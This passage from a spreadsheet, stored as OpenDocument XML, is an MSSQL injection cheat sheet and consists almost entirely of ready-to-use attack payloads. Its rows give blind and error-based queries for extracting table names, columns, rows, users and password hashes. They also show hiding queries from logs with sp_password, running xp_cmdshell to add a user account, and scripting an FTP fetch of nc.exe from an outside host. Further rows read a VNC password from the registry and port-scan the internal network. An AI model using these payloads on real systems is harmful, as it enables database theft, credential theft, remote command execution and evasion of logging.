            <text:p>1 AND ISNULL(ASCII(SUBSTRING(CAST((SELECT TOP 1 LOWER(name) FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 1 LOWER(name) FROM sysObjects WHERE xtYpe=0x55)) AS varchar(8000)),2,1)),0)&gt;97 – second char of first table</text:p>
            <text:p/>
            <text:p>In case of other tables, we can find other table names by changing the second select from "SELECT TOP 1" to be "SELECT TOP 2" , "SELECT TOP 3" and so on</text:p>
            <text:p>1 AND ISNULL(ASCII(SUBSTRING(CAST((SELECT TOP 1 LOWER(name) FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 2 LOWER(name) FROM sysObjects WHERE xtYpe=0x55)) AS varchar(8000)),1,1)),0)=97 – first char of second table</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro5">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Determine column name using char by char ASCII</text:p>
            <text:p> circumvent from magic quote filtering, you have to change 'tablename' to be the form of concatenating char() command.</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>1 AND ISNULL(ASCII(SUBSTRING(CAST((SELECT p.name FROM (SELECT (SELECT COUNT(i.colid)rid FROM syscolumns I WHERE(i.colid&lt;=o.colid) AND id=(SELECT id FROM sysobjects WHERE name='tablename'))x,name FROM syscolumns o WHERE id=(SELECT id FROM sysobjects WHERE name='tablename')) as p WHERE(p.x=1))AS varchar(8000)),1,1)),0)&gt;97 – first char of first column</text:p>
            <text:p>1 AND ISNULL(ASCII(SUBSTRING(CAST((SELECT p.name FROM (SELECT (SELECT COUNT(i.colid)rid FROM syscolumns i WHERE(i.colid&lt;=o.colid) AND id=(SELECT id FROM sysobjects WHERE name='tablename'))x,name FROM syscolumns o WHERE id=(SELECT id FROM sysobjects WHERE name='tablename')) as p WHERE(p.x=1))AS varchar(8000)),2,1)),0)&gt;97 –second char of first column</text:p>
            <text:p/>
            <text:p>Other columns, change ‘p.x=’ value</text:p>
            <text:p>1 AND ISNULL(ASCII(SUBSTRING(CAST((SELECT p.name FROM (SELECT (SELECT COUNT(i.colid)rid FROM syscolumns i WHERE(i.colid&lt;=o.colid) AND id=(SELECT id FROM sysobjects WHERE name='tablename'))x,name FROM syscolumns o WHERE id=(SELECT id FROM sysobjects WHERE name='tablename')) as p WHERE(p.x=2))AS varchar(8000)),1,1)),0)&gt;97 –first char of second column</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1" table:number-rows-repeated="2">
          <table:table-cell table:number-columns-repeated="2"/>
        </table:table-row>
        <table:table-row table:style-name="ro2">
          <table:table-cell table:style-name="ce2" office:value-type="string" calcext:value-type="string">
            <text:p>3 – ERROR sql injection</text:p>
          </table:table-cell>
          <table:table-cell/>
        </table:table-row>
        <table:table-row table:style-name="ro4">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Integer Injection</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>http://[site]/page.asp?id=1 having 1=1--</text:p>
            <text:p>Column '[COLUMN NAME]' is invalid in the select list because it is not contained in an aggregate function and there is no GROUP BY clause.</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro4">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>String injection</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>http://[site]/page.asp?id=x' having 1=1--</text:p>
            <text:p>Column '[COLUMN NAME]' is invalid in the select list because it is not contained in an aggregate function and there is no GROUP BY clause.</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro4">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Extract Database user</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>http://[site]/page.asp?id=1 or 1=convert(int,(USER))--</text:p>
            <text:p>Syntax error converting the nvarchar value '[DB USER]' to a column of data type int.</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro4">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Extract Database name</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>http://[site]/page.asp?id=1 or 1=convert(int,(DB_NAME))--</text:p>
            <text:p>Syntax error converting the nvarchar value '[DB NAME]' to a column of data type int.</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro4">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Extract Database version</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>http://[site]/page.asp?id=1 or 1=convert(int,(@@VERSION))--</text:p>
            <text:p>Syntax error converting the nvarchar value '[DB VERSION]' to a column of data type int.</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro4">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Extract Server name</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>http://[site]/page.asp?id=1 or 1=convert(int,(@@SERVERNAME))--</text:p>
            <text:p>Syntax error converting the nvarchar value '[SERVER NAME]' to a column of data type int.</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro4">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Extract 1<text:span text:style-name="T5">st</text:span> database table</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>http://[site]/page.asp?id=1  or 1=convert(int,(select top 1 name from sysobjects where xtype=char(85)))--</text:p>
            <text:p>Syntax error converting the nvarchar value '[TABLE NAME 1]' to a column of data type int.</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro4">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Extract 2<text:span text:style-name="T5">nd</text:span> database table</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>http://[site]/page.asp?id=1  or 1=convert(int,(select top 1 name from sysobjects where xtype=char(85) and ,name&gt;'TABLE-NAME-1'))--</text:p>
            <text:p>Syntax error converting the nvarchar value '[TABLE NAME 2]' to a column of data type int.</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro4">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Extract 3<text:span text:style-name="T5">rd</text:span> database table</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>http://[site]/page.asp?id=1  or 1=convert(int,(select top 1 name from sysobjects where xtype=char(85) and ,name&gt;'TABLE-NAME-2'))--</text:p>
            <text:p>Syntax error converting the nvarchar value '[TABLE NAME 3]' to a column of data type int.</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro4">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Extract 1<text:span text:style-name="T5">st</text:span> table column name</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>http://[site]/page.asp?id=1  or 1=convert(int,(select top 1 column_name from DBNAME.information_schema.columns where table_name='TABLE-NAME-1'))--</text:p>
            <text:p>Syntax error converting the nvarchar value '[COLUMN NAME  1]' to a column of data type int.</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro4">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Extract 2<text:span text:style-name="T5">nd</text:span> table column name</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>http://[site]/page.asp?id=1  or 1=convert(int,(select top 1 column_name from DBNAME.information_schema.columns where table_name='TABLE-NAME-1' and column_name&gt;'COLUMN-NAME-1'))--</text:p>
            <text:p>Syntax error converting the nvarchar value '[COLUMN NAME 2]' to a column of data type int.</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro4">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Extract 3<text:span text:style-name="T5">rd</text:span> table column name</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>http://[site]/page.asp?id=1  or 1=convert(int,(select top 1 column_name from DBNAME.information_schema.columns where table_name='TABLE-NAME-1' and column_name&gt;'COLUMN-NAME-2'))--</text:p>
            <text:p>Syntax error converting the nvarchar value '[COLUMN NAME  3]' to a column of data type int.</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro4">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Extract 1<text:span text:style-name="T5">st</text:span> field of 1<text:span text:style-name="T5">st</text:span> row</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>http://[site]/page.asp?id=1  or 1=convert(int,(select top 1 COLUMN-NAME-1 from TABLE-NAME-1))--</text:p>
            <text:p>Syntax error converting the nvarchar value '[FIELD 1 VALUE]' to a column of data type int.</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro4">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Extract 2<text:span text:style-name="T5">nd</text:span> field of 1<text:span text:style-name="T5">st</text:span> row</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>http://[site]/page.asp?id=1  or 1=convert(int,(select top 1 COLUMN-NAME-2 from TABLE-NAME-1))--</text:p>
            <text:p>Syntax error converting the nvarchar value '[FIELD 2 VALUE]' to a column of data type int.</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro4">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Extract 3<text:span text:style-name="T5">rd</text:span> field of 1<text:span text:style-name="T5">st</text:span> row</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>http://[site]/page.asp?id=1  or 1=convert(int,(select top 1 COLUMN-NAME-3 from TABLE-NAME-1))--</text:p>
            <text:p>Syntax error converting the nvarchar value '[FIELD 3 VALUE]' to a column of data type int.</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro4">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Extract 1<text:span text:style-name="T5">st</text:span> field of 2<text:span text:style-name="T5">nd</text:span> row</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>http://[site]/page.asp?id=1  or 1=convert(int,(select top 1 COLUMN-NAME-1 from TABLE-NAME-1 where COLUMN-NAME-1 NOT in ('FIELD-1-VALUE') order by COLUMN-NAME-1 desc))--</text:p>
            <text:p>Syntax error converting the nvarchar value '[FIELD 1 VALUE OF 2ND ROW]' to a column of data type int.</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro4">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Extract 1<text:span text:style-name="T5">st</text:span> field of 3<text:span text:style-name="T5">rd</text:span> row</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>http://[site]/page.asp?id=1  or 1=convert(int,(select top 1 COLUMN-NAME-1 from TABLE-NAME-1 where COLUMN-NAME-1 NOT in ('FIELD-2-VALUE') order by COLUMN-NAME-1 desc))--</text:p>
            <text:p>Syntax error converting the nvarchar value '[FIELD 1 VALUE OF 3RD ROW]' to a column of data type int.</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro18">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Convert find tables (same as above)</text:p>
            <text:p> Error based, give you information of the db_name/user_name/etc that failed the convert</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>1 and 1=convert(int,db_name())--</text:p>
            <text:p>1+and+1=convert(int,@@version)--</text:p>
            <text:p>1+and+1=convert(int,user_name())--</text:p>
            <text:p>1+and+1=convert(int,(select+top+1+table_name+from+information_schema.tables))-- --reveals table: threads</text:p>
            <text:p>1+and+1=convert(int,(select+top+1+table_name+from+information_schema.tables+where+table_name+not+in+('threads')))-- --reveals table: users</text:p>
            <text:p>1+and+1=convert(int,(select+top+1+table_name+from+information_schema.tables+where+table_name+not+in+('threads','users')))--</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro3">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Convert find columns (same as above)</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>1+and+1=convert(int,(select+top+1+column_name+from+information_schema.columns+where+table_name='users'))--</text:p>
            <text:p>1+and+1=convert(int,(select+top+1+column_name+from+information_schema.columns+where+table_name='users'+and+column_name+not+in+('uname')))--</text:p>
            <text:p>1+and+1=convert(int,(select+top+1+column_name+from+information_schema.columns+where+table_name='users'+and+column_name+not+in+('uname','upass')))--</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro3">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Convert get data from columns (same as above)</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>1+and+1=convert(int,(select+top+1+uname+from+users))--</text:p>
            <text:p>1+and+1=convert(int,(select+top+1+uname+from+users+where+uname+not+in+('admin')))--</text:p>
            <text:p>1+and+1=convert(int,(select+top+1+uname+from+users+where+uname+not+in+('admin','cwh')))--</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:number-columns-repeated="2"/>
        </table:table-row>
        <table:table-row table:style-name="ro2">
          <table:table-cell table:style-name="ce2" office:value-type="string" calcext:value-type="string">
            <text:p>5 – MISC and Functions</text:p>
          </table:table-cell>
          <table:table-cell/>
        </table:table-row>
        <table:table-row table:style-name="ro4">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>SP_PASSWORD (Hiding Query)</text:p>
            <text:p> Appending sp_password to the end of the query will hide it from T-SQL logs as a security measure. </text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>' AND 1=1—sp_password</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Stacked Queries</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>MSSQL supports stacked queries. </text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Edit XML in SOAP queries or XHTML requests for same injections</text:p>
          </table:table-cell>
          <table:table-cell/>
        </table:table-row>
        <table:table-row table:style-name="ro25">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>OPENROWSET:If you are not admin/sa, you can reconnect using brute force / password guess</text:p>
            <text:p>Starting with SQL Server 2005, OPENROWSET is disabled by default for non-administrative users. </text:p>
            <text:p>If you are dealing with SQL Server 2005/2008/2012 and you are not 'sa', then you are likely out of luck</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>1 union select * from openrowset('SQLoledb','server=VICTIMDBNAME;uid=$USER;pwd=$PASS','select * from master..sysusers')--</text:p>
            <text:p/>
            <text:p><text:span text:style-name="T3">SELECT * FROM OPENROWSET('SQLOLEDB', '127.0.0.1';'sa';'p4ssw0rd', 'SET FMTONLY OFF execute master..xp_cmdshell "dir"');</text:span></text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Execute OPENDATASOURCE function to execute a stored procedure under alternate user credentials</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>1; EXEC opendatasource('SQLoledb','Persist Security Info=False;DataSource=VICTIMDBNAME;UserID=CWH;Password=1234').master.dbo.xp_cmdshell 'net user hacklol 1234 /add'; --execute cmd connecting to the database as user CWH</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro16">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Upload an FTP connection script and launch a connection</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>exec master..xp_cmdshell 'echo open ftp.tester.org &gt; ftpscript.txt';--</text:p>
            <text:p>exec master..xp_cmdshell 'echo USER &gt;&gt; ftpscript.txt';-- </text:p>
            <text:p>exec master..xp_cmdshell 'echo PASS &gt;&gt; ftpscript.txt';--</text:p>
            <text:p>exec master..xp_cmdshell 'echo bin &gt;&gt; ftpscript.txt';--</text:p>
            <text:p>exec master..xp_cmdshell 'echo get nc.exe &gt;&gt; ftpscript.txt';--</text:p>
            <text:p>exec master..xp_cmdshell 'echo quit &gt;&gt; ftpscript.txt';--</text:p>
            <text:p>Exec master..xp_cmdshell 'ftp -s:ftpscript.txt';--</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro14">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Retrieve VNC password from registry</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>'; declare @out binary(8)</text:p>
            <text:p>exec master..xp_regread</text:p>
            <text:p>@rootkey = 'HKEY_LOCAL_MACHINE',</text:p>
            <text:p>@key = 'SOFTWARE\ORL\WinVNC3\Default',</text:p>
            <text:p>@value_name='password',</text:p>
            <text:p>@value = @out output</text:p>
            <text:p>select cast (@out as bigint) as x into TEMP--</text:p>
            <text:p/>
            <text:p>' and 1 in (select cast(x as varchar) from temp)--</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro3">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Rudimentary IP/Port scanner of internal network</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>1 union select * from openrowset('SQLoledb','uid=sa;pwd=;Network=DBMSSOCN;Address=10.10.10.12,80;timeout=5','select * from table')–</text:p>
            <text:p> if closed, timeout and error (not exist/denied). </text:p>
            <text:p> If open, no timeout and error (general/sqloledb)</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1" table:number-rows-repeated="2">
          <table:table-cell table:number-columns-repeated="2"/>
        </table:table-row>
        <table:table-row table:style-name="ro2">
          <table:table-cell table:style-name="ce2" office:value-type="string" calcext:value-type="string">
            <text:p>7 – Queries Only</text:p>
          </table:table-cell>
          <table:table-cell/>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Version</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>SELECT @@version</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro3">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Comments</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>SELECT 1 — comment</text:p>
            <text:p>SELECT /*comment*/1</text:p>
            <text:p>;%00 – nullbyte</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro26">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Current User</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>SELECT user_name();</text:p>
            <text:p>SELECT system_user;</text:p>
            <text:p>SELECT user;</text:p>
            <text:p>SELECT loginame FROM master..sysprocesses WHERE spid = @@SPID</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>List Users</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>SELECT name FROM master..syslogins</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Check if user is admin</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce13" office:value-type="string" calcext:value-type="string">
            <text:p>SELECT(CASE WHEN(IS_SRVROLEMEMBER(‘sysadmin’)=1)THEN’1’ELSE’0’END);</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro12">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Database Credentials</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>Database..Table</text:p>
            <text:p>  Master..syslogins, master..sysprocesses</text:p>
            <text:p>Columns</text:p>
            <text:p>  Name, loginame</text:p>
            <text:p>Current User</text:p>
            <text:p>  User, system_user; suser_sname(), is_srvrolemember(‘sysadmin’)</text:p>
            <text:p>Database Credentials</text:p>
            <text:p>  SELECT user,password FROM master.dbo.sysxlogins</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro26">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>List Password Hashes (priv)</text:p>
            <text:p><text:span text:style-name="T3">Sometimes Need to convert to hex to return hashes in MSSQL error message / some version of query analyzer.</text:span></text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>SELECT name, password FROM master..sysxlogins — mssql 2000;</text:p>
            <text:p>SELECT name, master.dbo.fn_varbintohexstr(password) FROM master..sysxlogins — mssql 2000.  </text:p>
            <text:p>SELECT name, password_hash FROM master.sys.sql_logins — mssql 2005;</text:p>
            <text:p>SELECT name + ‘-’ + master.sys.fn_varbintohexstr(password_hash) from master.sys.sql_logins — mssql 2005</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro27">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>List privileges</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>– current privs on a particular object in 2005, 2008</text:p>
            <text:p>SELECT permission_name FROM master..fn_my_permissions(null, ‘DATABASE’); — current database</text:p>
            <text:p>SELECT permission_name FROM master..fn_my_permissions(null, ‘SERVER’); — current server</text:p>
            <text:p>SELECT permission_name FROM master..fn_my_permissions(‘master..syslogins’, ‘OBJECT’); –permissions on a table</text:p>
            <text:p>SELECT permission_name FROM master..fn_my_permissions(‘sa’, ‘USER’);</text:p>
            <text:p/>
            <text:p>   –permissions on a user– current privs in 2005, 2008</text:p>
            <text:p>SELECT is_srvrolemember(‘sysadmin’);</text:p>
            <text:p>SELECT is_srvrolemember(‘dbcreator’);</text:p>
            <text:p>SELECT is_srvrolemember(‘bulkadmin’);</text:p>
            <text:p>SELECT is_srvrolemember(‘diskadmin’);</text:p>
            <text:p>SELECT is_srvrolemember(‘processadmin’);</text:p>
            <text:p>SELECT is_srvrolemember(‘serveradmin’);</text:p>
            <text:p>SELECT is_srvrolemember(‘setupadmin’);</text:p>
            <text:p>SELECT is_srvrolemember(‘securityadmin’);</text:p>
            <text:p/>
            <text:p>   – who has a particular priv? 2005, 2008</text:p>
            <text:p>SELECT name FROM master..syslogins WHERE denylogin = 0;</text:p>
            <text:p>SELECT name FROM master..syslogins WHERE hasaccess = 1;</text:p>
            <text:p>SELECT name FROM master..syslogins WHERE isntname = 0;</text:p>
            <text:p>SELECT name FROM master..syslogins WHERE isntgroup = 0;</text:p>
            <text:p>SELECT name FROM master..syslogins WHERE sysadmin = 1;</text:p>
            <text:p>SELECT name FROM master..syslogins WHERE securityadmin = 1;</text:p>
            <text:p>SELECT name FROM master..syslogins WHERE serveradmin = 1;</text:p>
            <text:p>SELECT name FROM master..syslogins WHERE setupadmin = 1;</text:p>
            <text:p>SELECT name FROM master..syslogins WHERE processadmin = 1;</text:p>
            <text:p>SELECT name FROM master..syslogins WHERE diskadmin = 1;</text:p>
            <text:p>SELECT name FROM master..syslogins WHERE dbcreator = 1;</text:p>
            <text:p>SELECT name FROM master..syslogins WHERE bulkadmin = 1;</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro6">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>List DBA Accounts</text:p>
            <text:p><text:span text:style-name="T3">   Also try ‘bulkadmin’, ‘systemadmin’ and other values from the documentation</text:span></text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>SELECT is_srvrolemember(‘sysadmin’); — is your account a sysadmin?  </text:p>
            <text:p>   returns 1 for true, 0 for false, NULL for invalid role.  </text:p>
            <text:p>SELECT is_srvrolemember(‘sysadmin’, ‘sa’); — is sa a sysadmin? return 1 for true, 0 for false, NULL for invalid role/username.</text:p>
            <text:p>SELECT name FROM master..syslogins WHERE sysadmin = ’1′ — tested on 2005</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Current Database</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>SELECT DB_NAME()</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro4">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>List databases</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>SELECT name FROM master..sysdatabases;</text:p>
            <text:p>SELECT DB_NAME(N); — for N = 0, 1, 2, …</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro28">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Determine number of columns ORDER/GROUP BY</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>ORDER BY n+1;</text:p>
            <text:p>1’ ORDER BY 1--</text:p>
            <text:p>1’ ORDER BY 2-- etc</text:p>
            <text:p>1’HAVING 1=1--</text:p>
            <text:p>1’ GROUP BY username HAVING 1=1--</text:p>
            <text:p>1’ GROUP BY username, password HAVING 1=1--</text:p>
            <text:p>May require TOP ie select top 1 .. .. .. order by</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro26">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>“LIMIT”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p><text:span text:style-name="T3">2012+ this worked for certain scenarios:</text:span></text:p>
            <text:p><text:span text:style-name="T3">SELECT * FROM sys.databases ORDER BY name OFFSET x ROWS FETCH NEXT 1 ROWS ONLY </text:span></text:p>
            <text:p><text:span text:style-name="T6"/></text:p>
            <text:p><text:span text:style-name="T7">Increment the offset</text:span></text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>List Columns</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce12" office:value-type="string" calcext:value-type="string">
            <text:p>SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = ‘mytable’); — for the current DB only</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5">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Retrieve columns</text:p>
            <text:p> Union</text:p>
            <text:p> Blind</text:p>
            <text:p> Error</text:p>
            <text:p> Error</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce12" office:value-type="string" calcext:value-type="string">
            <text:p>UNION SELECT name FROM master..syscolumns WHERE id = (SELECT id FROM master..syscolumns WHERE name = ‘tablename’)</text:p>
            <text:p>AND SELECT SUBSTRING(column_name,1,1)FROM information_schema.columns &gt; ‘A’</text:p>
            <text:p>AND 1 = (SELECT TOP 1 column_name FROM information_schema.columns)</text:p>
            <text:p>AND 1 = (SELECT TOP 1 column_name FROM information_schema.columns WHERE column_name NOT IN(SELECT TOP 1 column_name FROM information_schema.columns))</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro5">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>List Tables</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>SELECT name FROM master..sysobjects WHERE xtype = ‘U’; — use xtype = ‘V’ for views</text:p>
            <text:p/>
            <text:p>SELECT name FROM someotherdb..sysobjects WHERE xtype = ‘U’;</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3">
          <table:table-cell table:style-name="ce6" office:value-type="string" calcext:value-type="string">
            <text:p>Find tables from column name</text:p>
            <text:p>– NB: This example works only for the current database.  If you wan’t to search another db, you need to specify the db name (e.g.replace sysobject with mydb..sysobjects).</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce12" office:value-type="string" calcext:value-type="string">
            <text:p>SELECT sysobjects.name as tablename, syscolumns.name as columnname FROM sysobjects JOIN syscolumns ON sysobjects.id = syscolumns.id WHERE sysobjects.xtype = ‘U’ AND syscolumns.name LIKE ‘%PASSWORD%’ — this lists table, column for each column containing the word ‘password’</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro5">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Retrieve tables</text:p>
            <text:p> UNION (xtype=’U’ is for user-defined tables, ‘V’ for views)</text:p>
            <text:p> Blind</text:p>
            <text:p> Error</text:p>
            <text:p> Error</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>UNION SELECT name FROM master..sysobjects WHERE xtype=’U’</text:p>
            <text:p>AND SELECT SUBSTRING(table_name,1,1) FROM information_schema.tables &gt; ‘A’</text:p>
            <text:p>AND 1 = (SELECT TOP 1 table_name FROM information_schema.tables)</text:p>
            <text:p>AND 1 = (SELECT TOP 1 table_name FROM information_schema.tables WHERE table_name NOT IN(SELECT TOP 1 table_name FROM information_schema.tables))</text:p>
          </table:table-cell>
